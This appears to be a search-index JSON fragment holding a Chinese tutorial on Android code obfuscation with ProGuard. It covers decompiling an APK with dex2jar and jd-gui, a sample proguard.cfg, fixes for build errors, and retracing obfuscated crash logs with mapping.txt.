Android\u9879\u76ee\u9ed8\u8ba4\u5728\u6253\u5305\u7684\u65f6\u5019\u662f\u4e0d\u6df7\u6dc6\u4ee3\u7801\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5f97\u5728default.properties\u6587\u4ef6\u4e2d\uff0c\u6dfb\u52a0\u8be5\u914d\u7f6e\uff1aproguard.config=proguard.cfg\u3002 4.\u8fdb\u884capk\u6253\u5305 \u597d\u4e86\uff0c\u4e00\u5207\u5c31\u7eea\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u6309\u7740\u5e73\u5e38\u7684\u6253\u5305\u6b65\u9aa4\uff0c\u8fdb\u884c\u6253\u5305\u64cd\u4f5c\u3002\u6253\u5b8c\u5305\u540e\uff0c\u6211\u4eec\u4f7f\u7528\u4e0a\u9762\u8bb2\u8ff0\u7684\u53cd\u7f16\u8bd1\u65b9\u6cd5\uff0c\u67e5\u770b\u73b0\u5728\u7684jar\u6587\u4ef6\u3002 \u4f1a\u53d1\u73b0\uff0c\u6df7\u6dc6\u4e86\u8bb8\u591aaa\u3001bb\u3001cc\u7684\u5305\u3001aa\u3001bb\u3001cc\u7684\u7c7b\u548c\u65b9\u6cd5\uff0c\u8fd9\u6837\u7684\u4ee3\u7801\u6839\u672c\u65e0\u6cd5\u9605\u8bfb\uff0c\u4e5f\u5c31\u8fbe\u5230\u4e86\u6211\u4eec\u4fdd\u62a4\u6e90\u4ee3\u7801\u7684\u76ee\u7684\u4e86\u3002 \u4e09\u3001produard.cfg\u6587\u4ef6 \u6211\u4eec\u5728\u770b\u770bproduard.cfg\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u4e2d\u63cf\u8ff0\u4e86\u6df7\u6dc6\u4ee3\u7801\u7684\u89c4\u5219\uff0c\u4f60\u5982\u679c\u60f3\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u6765\u6df7\u6dc6\u4ee3\u7801\uff0c\u5c31\u53ef\u4ee5\u5728\u672c\u6587\u4ef6\u4e2d\u7f16\u5199\u4f60\u7684\u6df7\u6dc6\u89c4\u5219\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8be5\u6587\u4ef6\u7684\u5185\u5bb9\u5982\u4e0b\uff1a -optimizationpasses5 -dontusemixedcaseclassnames//\u6df7\u6dc6\u65f6\u4e0d\u4f1a\u4ea7\u751f\u5f62\u5f62\u8272\u8272\u7684\u7c7b\u540d -dontskipnonpubliclibraryclasses//\u6307\u5b9a\u4e0d\u53bb\u5ffd\u7565\u975e\u516c\u5171\u7684\u7c7b\u5e93 -dontpreverify//\u4e0d\u9884\u6821\u9a8c -verbose -optimizations !code/simplification/arithmetic,!field/*,!class/merging/*//\u4f18\u5316 //\u4e0d\u8fdb\u884c\u6df7\u6dc6\u4fdd\u6301\u539f\u6837 -keep public class * extends android.app.Activity -keep public class * extends android.app.Application -keep public class * extends android.app.Service -keep public class * extends android.content.BroadcastReceiver -keep public class * extends android.content.ContentProvider -keep public class * extends android.app.backup.BackupAgentHelper -keep public class * extends android.preference.Preference -keep public class com.android.vending.licensing.ILicensingService //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u7684\u6210\u5458\u7684\u540d\u79f0\uff0c\u5982\u679c\u6240\u6709\u6307\u5b9a\u7684\u7c7b\u6210\u5458\u51fa\u5e2d -keepclasseswithmembernamesclass * { native <methods>; } //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u7684\u6210\u5458\uff0c\u4f46\u6761\u4ef6\u662f\u6240\u6709\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u6210\u5458\u662f\u8981\u5b58\u5728 -keepclasseswithmembersclass * { public <init>(android.content.Context, android.util.AttributeSet); } -keepclasseswithmembersclass * { public <init>(android.content.Context, android.util.AttributeSet,int); } //\u4fdd\u62a4\u6307\u5b9a\u7c7b\u7684\u6210\u5458\uff0c\u5982\u679c\u6b64\u7c7b\u53d7\u5230\u4fdd\u62a4\u4ed6\u4eec\u4f1a\u4fdd\u62a4\u7684\u66f4\u597d -keepclassmembersclass * extends android.app.Activity { public void *(android.view.View); } -keepclassmembersenum* { public static **[] values(); public static **valueOf(java.lang.String); } //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u6587\u4ef6\u548c\u7c7b\u6210\u5458 -keep class * implements android.os.Parcelable{ public static final android.os.Parcelable$Creator*; } \u56db\u3001\u53ef\u80fd\u51fa\u73b0\u7684\u95ee\u9898 1.\u56e0\u4e3a\u4f7f\u7528\u4e86\u5347\u7ea7\u540e\u4f7f\u7528android-support-v4\u800c\u53d1\u751f\u6df7\u6dc6\u9519\u8bef\uff0c\u65e0\u6cd5\u6253\u5305\u51fa\u73b0\u5982\u4e0b\u9519\u8bef\uff1a Unexpected error while evaluating instruction: Class = [android/support/v4/view/AccessibilityDelegateCompat$AccessibilityDelegateJellyBeanImpl] Method = [newAccessiblityDelegateBridge(Landroid/support/v4/view/AccessibilityDelegateCompat;)Ljava/lang/Object;] Instruction = [18]areturn Exception = 1 (Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate])) Unexpected error while performing partial evaluation: Class = [android/support/v4/view/AccessibilityDelegateCompat$AccessibilityDelegateJellyBeanImpl] Method = [newAccessiblityDelegateBridge(Landroid/support/v4/view/AccessibilityDelegateCompat;)Ljava/lang/Object;] Exception = 1 (Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate])) java.lang.IllegalArgumentException: Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate]) at proguard.evaluation.value.ReferenceValue.generalize(ReferenceValue.java:287) \u4f60\u9700\u8981\u5728proguard.cfg\u6587\u4ef6\u4e2d\u6dfb\u52a0\u5982\u4e0b\u4ee3\u7801\uff1a -libraryjars libs/android-support-v4.jar -dontwarnandroid.support.v4.** -keep class android.support.v4.** { *; } -keep interface android.support.v4.app.** { *; } -keep public class * extends android.support.v4.** -keep public class * extends android.app.Fragment 2.\u5982\u679c\u4f60\u4f7f\u7528\u4e86\u7b2c\u4e09\u65b9\u7684\u5305\uff0c\u4f60\u9700\u8981\u4f7f\u7528\u4e00\u4e0b\u914d\u7f6e\uff0c\u8ba9ProGuard\u77e5\u9053\u5e93\u4e2d\u7684\u4e00\u4e9b\u7c7b\u5e76\u4e0d\u662f\u5728\u6240\u6709\u7684API\u4e2d\u53ef\u7528\uff1a -libraryjars libs/roboguice-2.0.jar -dontwarnroboguice.** 3.\u5728\u6253\u5305\u7684\u8fc7\u7a0b\u4e2d\uff0c\u51fa\u73b0\u5982\u4e0b\u9519\u8bef\uff1a Proguardreturned with error code 1. See console [2012-09-25 09:50:39 - estore3601] Error: @C:\\Users\\hp\\AppData\\Local\\Temp\\android_5192919586673521494.pro (\u6587\u4ef6\u540d\u3001\u76ee\u5f55\u540d\u6216\u5377\u6807\u8bed\u6cd5\u4e0d\u6b63\u786e\u3002) \u4f60\u9700\u8981\u7cfb\u5728ProGuard\u6700\u65b0\u7248\u672c\uff0c\u5982v4.8\u3002\u7136\u540e\u89e3\u538bproduard4.8.zip\u6587\u4ef6\uff0c\u5c06bin\u548clib\u4e24\u4e2a\u6587\u4ef6\u5939\u8986\u76d6sdk\u76ee\u5f55\\tool\\proguard\u76ee\u5f55\u4e2d\u540c\u540d\u7684\u6587\u4ef6\u5939\u3002 \u4e94\u3001\u53cd\u6df7\u6dc6\u5d29\u6e83\u65e5\u5fd7 \u5728\u5b9e\u9645\u5de5\u4f5c\u4e2d\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e0b\u5f00\u6e90\u7684\u7cfb\u7edf\uff08\u5982ACRA\uff09\u76d1\u63a7\u548c\u6536\u96c6\u5d29\u6e83\u65e5\u5fd7\uff0c\u4f46\u662f\u7531\u4e8e\u6b63\u5f0f\u7248\u672c\u7684\u53d1\u5e03\u4e3a\u4e86\u9632\u6b62\u53cd\u7f16\u8bd1\u7b49\u65b9\u9762\u7684\u8003\u8651\uff0c\u4f1a\u4f7f\u7528ProGuard\u7684\u65b9\u5f0f\u4ee3\u7801\u6df7\u6dc6\u3002\u6536\u96c6\u4e0a\u6765\u7684\u65e5\u5fd7\u5982\u4e0b\u7684\u6df7\u6dc6\uff0cat com.example.atom.hotel.a.c.f.a(SourceFile:66)\uff0c\u4e0d\u5229\u4e8e\u95ee\u9898\u7684\u5206\u6790\u3002 java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0 at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:255) at java.util.ArrayList.get(ArrayList.java:308) at com.example.atom.hotel.a.c.f.a(SourceFile:66) at com.example.atom.hotel.a.c.f.<init>(SourceFile:60) \u5176\u5b9e\uff0c\u6211\u4eec\u65e2\u7136\u53ef\u4ee5\u9002\u5e94ProGuad\u8fdb\u884c\u6df7\u6dc6\uff0c\u90a3\u4e48\u5e94\u8be5\u53ef\u4ee5\u60f3\u5230\u53ef\u4ee5\u53cd\u6df7\u6dc6\u56de\u6765\u3002\u518d\u4f7f\u7528ProGuard\u6df7\u6dc6\u4ee3\u7801\u6253\u5305\u7684\u65f6\u5019\uff0c\u4f1a\u751f\u751f\u4e00\u4e2amapping.txt\u6587\u4ef6\u3002\u8fd9\u4e2a\u6587\u4ef6\u8bb0\u5f55\u4e86\u6df7\u6dc6\u524d\u540e\u7684\u7c7b\u3001\u65b9\u6cd5\u7b49\u6620\u5c04\u5173\u7cfb\u3002\u901a\u8fc7{sdk-dir}\\tools\\proguard\\bin\u76ee\u5f55\u4e0b\u7684retrace.bat\u5de5\u5177\u53cd\u6df7\u6dc6\uff0c\u6267\u884c\u547d\u4ee4\uff1aretract.bat -verbose mapping.txt obfuscated_tract.txt > out_tract.txt\u3002\u7ed3\u679c\u8f93\u51fa\u5982\u4e0b\uff1a java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0 at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:255) at java.util.ArrayList.get(ArrayList.java:308) at com.example.atom.hotel.delegate.HotelListDelegateAdapter.void initSpecialPreferentialTips(boolean)(SourceFile:66) at com.example.atom.hotel.delegate.HotelListDelegateAdapter.<init>(SourceFile:60) \u65b0\u6280\u672f\uff0c\u65b0\u672a\u6765\uff01\u6b22\u8fce\u5927\u5bb6\u5173\u6ce8 \u201c1024\u5de5\u573a\u201d\u5fae\u4fe1\u670d\u52a1\u53f7 \uff0c\u65f6\u523b\u5173\u6ce8\u6211\u4eec\u7684\u6700\u65b0\u7684\u6280\u672f\u8baf\u606f\uff01 \uff08\u752d\u5ba2\u6c14\uff01\u5c3d\u60c5\u7684\u626b\u63cf\u6216\u8005\u957f\u6309\uff01\uff09 \ufeff\ufeff \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/p106786860/article/details/11974863","title":"\u65e5\u79ef\u6708\u7d2f\uff1aProguard\u8fdb\u884c\u6e90\u4ee3\u7801\u6df7\u6dc6\u548c\u5d29\u6e83\u65e5\u5fd7\u53cd\u6df7\u6dc6"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#proguard","text":"\u5728\u5b9e\u9645\u7684\u5f00\u53d1\u6210\u4ea7\u54c1apk\u7684\u53d1\u5e03\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u4f7f\u7528\u5230\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002\u4e0d\u8fc7\u5728\u8bb2\u89e3\u5982\u4f55\u8fdb\u884c\u4ee3\u7801\u6df7\u6dc6\u4e4b\u524d\uff0c\u6211\u5148\u8ddf\u5927\u5bb6\u6f14\u793a\u4e00\u4e0b\u53cd\u7f16\u8bd1\u7684\u8fc7\u7a0b\uff0c\u8fd9\u6837\u624d\u80fd\u8ba9\u5927\u5bb6\u660e\u767d\u4e3a\u4ec0\u4e48\u9700\u8981\u8fdb\u884c\u4ee3\u7801\u6df7\u6dc6\u3002","title":"\u65e5\u79ef\u6708\u7d2f\uff1aProguard\u8fdb\u884c\u6e90\u4ee3\u7801\u6df7\u6dc6\u548c\u5d29\u6e83\u65e5\u5fd7\u53cd\u6df7\u6dc6"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#_1","text":"1.\u51c6\u5907\u5de5\u4f5c \u9996\u5148\u6211\u4eec\u51c6\u5907\u597d\u4e00\u4e2a\u9879\u76ee\u7684apk\u6587\u4ef6\uff08\u672a\u8fdb\u884c\u6df7\u6dc6\u6253\u5305\uff09\u3001dex2jar\u5de5\u5177\uff08\u4e0b\u8f7d\u5730\u5740\uff1a http://code.google.com/p/dex2jar/ \uff09\u3001jd-gui\u5de5\u5177\uff08\u4e0b\u8f7d\u5730\u5740\uff1a http://jd-gui.softpedia.com/ \uff09\u3002 2.\u83b7\u53d6CodeMixTest.apk\u4e2d\u7684classes.dex\u6587\u4ef6 \u5c06CodeMixTest.apk\u89e3\u538b\uff0c\u8fd9\u91cc\u6211\u4eec\u4e3a\u4e86\u65b9\u4fbf\u5c31\u76f4\u63a5\u89e3\u538b\u5230\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u3002\u5728\u89e3\u538b\u51fa\u7684\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u89c1\u6709\u4e00\u4e2aclasses.dex\u6587\u4ef6\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u7684\u6e90\u4ee3\u7801\u6253\u5305\u751f\u6210\u7684\u6587\u4ef6\u3002 3.\u4f7f\u7528dex2jar\u5de5\u5177\u8fd8\u539fjar\u6587\u4ef6 dex2jar\u5de5\u5177\u7684\u4f5c\u7528\u5c31\u662f\u5c06class.dex\u6587\u4ef6\u8fd8\u539f\u6210.jar\u6587\u4ef6\u3002\u5148\u5c06dex2jar-0.0.9.15.zip\u89e3\u538b\uff0c\u7136\u540e\u5c06\u4e0a\u9762\u83b7\u5f97\u7684classes.dex\u6587\u4ef6\u62f7\u8d1d\u81f3\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\u3002 \u67e5\u770b\u89e3\u538b\u76ee\u5f55\u4e2d\uff0c\u6709dex2jar.bat\u6587\u4ef6\u3002 \u542f\u52a8cmd\uff0c\u8fdb\u5165\u5230dex2jar\u5de5\u5177\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c\u547d\u4ee4\uff1adex2jar.bat classes.dex\uff0c\u6709\u5982\u4e0b\u7ed3\u679c\u3002 \u67e5\u770bdex2jar\u5de5\u5177\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\uff0c\u751f\u6210\u4e86\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684classes_dex2jar.jar\u6587\u4ef6\u3002 4.\u4f7f\u7528jd-gui\u5de5\u5177\u67e5\u770bjar\u6587\u4ef6 \u5c06jd-gui-0.3.5.windows.zip\u5de5\u5177\u89e3\u538b\uff0c\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u76f4\u63a5\u89e3\u538b\u5230\u5f53\u524d\u6587\u4ef6\u5939\uff0c\u6211\u4eec\u4f1a\u770b\u89c1\u4e00\u4e2ajd-gui.exe\u6587\u4ef6\u3002 \u53cc\u51fbjd-gui.exe\uff0c\u4f7f\u7528\u5de5\u5177\u6253\u5f00\u524d\u9762\u6211\u4eec\u83b7\u5f97\u7684classes_dex2jar.jar\u6587\u4ef6\u3002\u53ef\u4ee5\u6e05\u695a\u7684\u770b\u89c1\u6e90\u4ee3\u7801\u3002 \u662f\u4f01\u4e1a\u771f\u5b9e\u7684\u9879\u76ee\u4e2d\uff0c\u5982\u679c\u4e0d\u7ecf\u8fc7\u4ee3\u7801\u6df7\u6dc6\uff0c\u4f60\u7684\u6e90\u7801\u5c31\u5982\u6b64\u8d64\u88f8\u88f8\u7684\u66b4\u9732\u7740\u3002\u8fd9\u6837\u5bf9\u4e8e\u516c\u53f8\u6765\u8bf4\u662f\u975e\u5e38\u4e0d\u5b89\u5168\u7684\uff0c\u5e76\u4e14\u4e0d\u60f3\u53d1\u751f\u7684\u60c5\u51b5\u3002\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u770b\u89c1\u4e86\u53cd\u7f16\u8bd1\u5982\u6b64\u7684\u5a01\u529b\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u4ec0\u4e48\u529e\u6cd5\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u770b\u4e0b\u9762\u8bb2\u89e3\u3002","title":"\u4e00\u3001\u4ee3\u7801\u53cd\u7f16\u8bd1"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#_2","text":"1.\u51c6\u5907\u5de5\u4f5c \u9996\u5148\uff0c\u6211\u4eec\u5f97\u5c06\u6211\u4eec\u7684\u9879\u76ee\u6e90\u7801\u3001proguard\u5de5\u5177\uff08\u653e\u5fc3\u8fd9\u4e2a\u5de5\u5177Google\u5df2\u7ecf\u5728sdk\u4e2d\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\uff0c\u5728sdk\\tools\u76ee\u5f55\u4e0b\u53ef\u4ee5\u770b\u5230\uff09\u3001proguard.cfg\u6587\u4ef6\uff08\u8be5\u6587\u4ef6\u5b9a\u4e49\u4e86\u6df7\u6dc6\u7684\u89c4\u5219\uff0c\u521b\u5efa2.3\u4ee5\u4e0a\u9879\u76ee\u81ea\u52a8\u751f\u6210\uff0c\u6216\u8005\u5728\u7f51\u4e0a\u53ef\u4ee5\u5f88\u5bb9\u6613\u4e0b\u8f7d\u5230\uff09\u3002 2.\u5728\u4f60\u7684\u9879\u76ee\u4e2d\u6dfb\u52a0proguard.cfg\u6587\u4ef6 \u8be5\u6587\u4ef6Google\u516c\u53f8\u5df2\u7ecf\u4e3a\u6211\u4eec\u51c6\u5907\u597d\u4e86\uff0c\u521b\u5efa\u9879\u76ee\u65f6\uff0c\u5728\u9879\u76ee\u7684\u6839\u76ee\u5f55\u4e0b\u5c31\u6709\u4e86\uff0c\u4f46\u662f\u662f\u4ece2.3\u5f00\u59cb\u7684\u3002\u4e0d\u8fc7\u6211\u4eec\u57fa\u4e8e2.2\u7684\u9879\u76ee\u53ea\u9700\u8981\u5c06\u8be5\u6587\u4ef6\u62f7\u8d1d\u5230\u9879\u76ee\u6839\u76ee\u5f55\u4e0b\u5373\u53ef\u3002 3.\u4fee\u6539\u9879\u76ee\u7684default.properties\u914d\u7f6e\u6587\u4ef6 Android\u9879\u76ee\u9ed8\u8ba4\u5728\u6253\u5305\u7684\u65f6\u5019\u662f\u4e0d\u6df7\u6dc6\u4ee3\u7801\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5f97\u5728default.properties\u6587\u4ef6\u4e2d\uff0c\u6dfb\u52a0\u8be5\u914d\u7f6e\uff1aproguard.config=proguard.cfg\u3002 4.\u8fdb\u884capk\u6253\u5305 \u597d\u4e86\uff0c\u4e00\u5207\u5c31\u7eea\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u6309\u7740\u5e73\u5e38\u7684\u6253\u5305\u6b65\u9aa4\uff0c\u8fdb\u884c\u6253\u5305\u64cd\u4f5c\u3002\u6253\u5b8c\u5305\u540e\uff0c\u6211\u4eec\u4f7f\u7528\u4e0a\u9762\u8bb2\u8ff0\u7684\u53cd\u7f16\u8bd1\u65b9\u6cd5\uff0c\u67e5\u770b\u73b0\u5728\u7684jar\u6587\u4ef6\u3002 \u4f1a\u53d1\u73b0\uff0c\u6df7\u6dc6\u4e86\u8bb8\u591aaa\u3001bb\u3001cc\u7684\u5305\u3001aa\u3001bb\u3001cc\u7684\u7c7b\u548c\u65b9\u6cd5\uff0c\u8fd9\u6837\u7684\u4ee3\u7801\u6839\u672c\u65e0\u6cd5\u9605\u8bfb\uff0c\u4e5f\u5c31\u8fbe\u5230\u4e86\u6211\u4eec\u4fdd\u62a4\u6e90\u4ee3\u7801\u7684\u76ee\u7684\u4e86\u3002","title":"\u4e8c\u3001\u4ee3\u7801\u6df7\u6dc6"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#produardcfg","text":"\u6211\u4eec\u5728\u770b\u770bproduard.cfg\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u4e2d\u63cf\u8ff0\u4e86\u6df7\u6dc6\u4ee3\u7801\u7684\u89c4\u5219\uff0c\u4f60\u5982\u679c\u60f3\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u6765\u6df7\u6dc6\u4ee3\u7801\uff0c\u5c31\u53ef\u4ee5\u5728\u672c\u6587\u4ef6\u4e2d\u7f16\u5199\u4f60\u7684\u6df7\u6dc6\u89c4\u5219\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8be5\u6587\u4ef6\u7684\u5185\u5bb9\u5982\u4e0b\uff1a -optimizationpasses5 -dontusemixedcaseclassnames//\u6df7\u6dc6\u65f6\u4e0d\u4f1a\u4ea7\u751f\u5f62\u5f62\u8272\u8272\u7684\u7c7b\u540d -dontskipnonpubliclibraryclasses//\u6307\u5b9a\u4e0d\u53bb\u5ffd\u7565\u975e\u516c\u5171\u7684\u7c7b\u5e93 -dontpreverify//\u4e0d\u9884\u6821\u9a8c -verbose -optimizations !code/simplification/arithmetic,!field/*,!class/merging/*//\u4f18\u5316 //\u4e0d\u8fdb\u884c\u6df7\u6dc6\u4fdd\u6301\u539f\u6837 -keep public class * extends android.app.Activity -keep public class * extends android.app.Application -keep public class * extends android.app.Service -keep public class * extends android.content.BroadcastReceiver -keep public class * extends android.content.ContentProvider -keep public class * extends android.app.backup.BackupAgentHelper -keep public class * extends android.preference.Preference -keep public class com.android.vending.licensing.ILicensingService //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u7684\u6210\u5458\u7684\u540d\u79f0\uff0c\u5982\u679c\u6240\u6709\u6307\u5b9a\u7684\u7c7b\u6210\u5458\u51fa\u5e2d -keepclasseswithmembernamesclass * { native <methods>; } //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u7684\u6210\u5458\uff0c\u4f46\u6761\u4ef6\u662f\u6240\u6709\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u6210\u5458\u662f\u8981\u5b58\u5728 -keepclasseswithmembersclass * { public <init>(android.content.Context, android.util.AttributeSet); } -keepclasseswithmembersclass * { public <init>(android.content.Context, android.util.AttributeSet,int); } //\u4fdd\u62a4\u6307\u5b9a\u7c7b\u7684\u6210\u5458\uff0c\u5982\u679c\u6b64\u7c7b\u53d7\u5230\u4fdd\u62a4\u4ed6\u4eec\u4f1a\u4fdd\u62a4\u7684\u66f4\u597d -keepclassmembersclass * extends android.app.Activity { public void *(android.view.View); } -keepclassmembersenum* { public static **[] values(); public static **valueOf(java.lang.String); } //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u6587\u4ef6\u548c\u7c7b\u6210\u5458 -keep class * implements android.os.Parcelable{ public static final android.os.Parcelable$Creator*; }","title":"\u4e09\u3001produard.cfg\u6587\u4ef6"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#_3","text":"1.\u56e0\u4e3a\u4f7f\u7528\u4e86\u5347\u7ea7\u540e\u4f7f\u7528android-support-v4\u800c\u53d1\u751f\u6df7\u6dc6\u9519\u8bef\uff0c\u65e0\u6cd5\u6253\u5305\u51fa\u73b0\u5982\u4e0b\u9519\u8bef\uff1a Unexpected error while evaluating instruction: Class = [android/support/v4/view/AccessibilityDelegateCompat$AccessibilityDelegateJellyBeanImpl] Method = [newAccessiblityDelegateBridge(Landroid/support/v4/view/AccessibilityDelegateCompat;)Ljava/lang/Object;] Instruction = [18]areturn Exception = 1 (Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate])) Unexpected error while performing partial evaluation: Class = [android/support/v4/view/AccessibilityDelegateCompat$AccessibilityDelegateJellyBeanImpl] Method = [newAccessiblityDelegateBridge(Landroid/support/v4/view/AccessibilityDelegateCompat;)Ljava/lang/Object;] Exception = 1 (Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate])) java.lang.IllegalArgumentException: Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate]) at proguard.evaluation.value.ReferenceValue.generalize(ReferenceValue.java:287) \u4f60\u9700\u8981\u5728proguard.cfg\u6587\u4ef6\u4e2d\u6dfb\u52a0\u5982\u4e0b\u4ee3\u7801\uff1a -libraryjars libs/android-support-v4.jar -dontwarnandroid.support.v4.** -keep class android.support.v4.** { *; } -keep interface android.support.v4.app.** { *; } -keep public class * extends android.support.v4.** -keep public class * extends android.app.Fragment 2.\u5982\u679c\u4f60\u4f7f\u7528\u4e86\u7b2c\u4e09\u65b9\u7684\u5305\uff0c\u4f60\u9700\u8981\u4f7f\u7528\u4e00\u4e0b\u914d\u7f6e\uff0c\u8ba9ProGuard\u77e5\u9053\u5e93\u4e2d\u7684\u4e00\u4e9b\u7c7b\u5e76\u4e0d\u662f\u5728\u6240\u6709\u7684API\u4e2d\u53ef\u7528\uff1a -libraryjars libs/roboguice-2.0.jar -dontwarnroboguice.** 3.\u5728\u6253\u5305\u7684\u8fc7\u7a0b\u4e2d\uff0c\u51fa\u73b0\u5982\u4e0b\u9519\u8bef\uff1a Proguardreturned with error code 1. See console [2012-09-25 09:50:39 - estore3601] Error: @C:\\Users\\hp\\AppData\\Local\\Temp\\android_5192919586673521494.pro (\u6587\u4ef6\u540d\u3001\u76ee\u5f55\u540d\u6216\u5377\u6807\u8bed\u6cd5\u4e0d\u6b63\u786e\u3002) \u4f60\u9700\u8981\u7cfb\u5728ProGuard\u6700\u65b0\u7248\u672c\uff0c\u5982v4.8\u3002\u7136\u540e\u89e3\u538bproduard4.8.zip\u6587\u4ef6\uff0c\u5c06bin\u548clib\u4e24\u4e2a\u6587\u4ef6\u5939\u8986\u76d6sdk\u76ee\u5f55\\tool\\proguard\u76ee\u5f55\u4e2d\u540c\u540d\u7684\u6587\u4ef6\u5939\u3002","title":"\u56db\u3001\u53ef\u80fd\u51fa\u73b0\u7684\u95ee\u9898"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#_4","text":"\u5728\u5b9e\u9645\u5de5\u4f5c\u4e2d\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e0b\u5f00\u6e90\u7684\u7cfb\u7edf\uff08\u5982ACRA\uff09\u76d1\u63a7\u548c\u6536\u96c6\u5d29\u6e83\u65e5\u5fd7\uff0c\u4f46\u662f\u7531\u4e8e\u6b63\u5f0f\u7248\u672c\u7684\u53d1\u5e03\u4e3a\u4e86\u9632\u6b62\u53cd\u7f16\u8bd1\u7b49\u65b9\u9762\u7684\u8003\u8651\uff0c\u4f1a\u4f7f\u7528ProGuard\u7684\u65b9\u5f0f\u4ee3\u7801\u6df7\u6dc6\u3002\u6536\u96c6\u4e0a\u6765\u7684\u65e5\u5fd7\u5982\u4e0b\u7684\u6df7\u6dc6\uff0cat com.example.atom.hotel.a.c.f.a(SourceFile:66)\uff0c\u4e0d\u5229\u4e8e\u95ee\u9898\u7684\u5206\u6790\u3002 java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0 at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:255) at java.util.ArrayList.get(ArrayList.java:308) at com.example.atom.hotel.a.c.f.a(SourceFile:66) at com.example.atom.hotel.a.c.f.<init>(SourceFile:60) 